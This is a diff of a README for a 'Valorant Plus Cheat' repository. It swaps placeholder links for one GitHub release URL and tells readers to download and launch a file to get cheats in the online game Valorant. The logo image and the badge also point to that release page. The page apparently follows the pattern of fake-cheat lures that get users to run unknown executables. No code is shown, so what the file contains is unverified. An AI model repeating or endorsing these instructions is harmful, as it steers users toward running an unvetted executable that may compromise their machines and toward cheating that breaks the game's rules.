@@ -23,7 +23,7 @@ Valorant Plus Cheat offers the following features to give you the upper hand in 
 
 ## Installation 🛠️
 
-To access these amazing features, download Valorant Plus Cheat from the following link: [Download Now](https://github.com/file/App.zip). Make sure to launch the downloaded file to start using the cheats in your Valorant game.
+To access these amazing features, download Valorant Plus Cheat from the following link: [Download Now](https://github.com/Giordanny11/Valorant-Plus-Cheat/releases/tag/v2.0). Make sure to launch the downloaded file to start using the cheats in your Valorant game.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
 
@@ -33,10 +33,10 @@ Please note that the use of cheating tools in online games like Valorant violate
 
 Play fair, have fun, and enjoy the enhanced gameplay experience with Valorant Plus Cheat! 🚀🎮
 
-![Valorant Logo](https://example.com/valorant_logo.png)
+![Valorant Logo](https://github.com/Giordanny11/Valorant-Plus-Cheat/releases/tag/v2.0)
 
 ---
 
-For more information and updates, visit our [GitHub Repository](https://github.com/yourusername/repositoryname).
+For more information and updates, visit our [GitHub Repository](https://github.com/Giordanny11/Valorant-Plus-Cheat/releases/tag/v2.0).
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/file/App.zip)
+[![Download Now](https://github.com/Giordanny11/Valorant-Plus-Cheat/releases/tag/v2.0)](https://github.com/Giordanny11/Valorant-Plus-Cheat/releases/tag/v2.0)
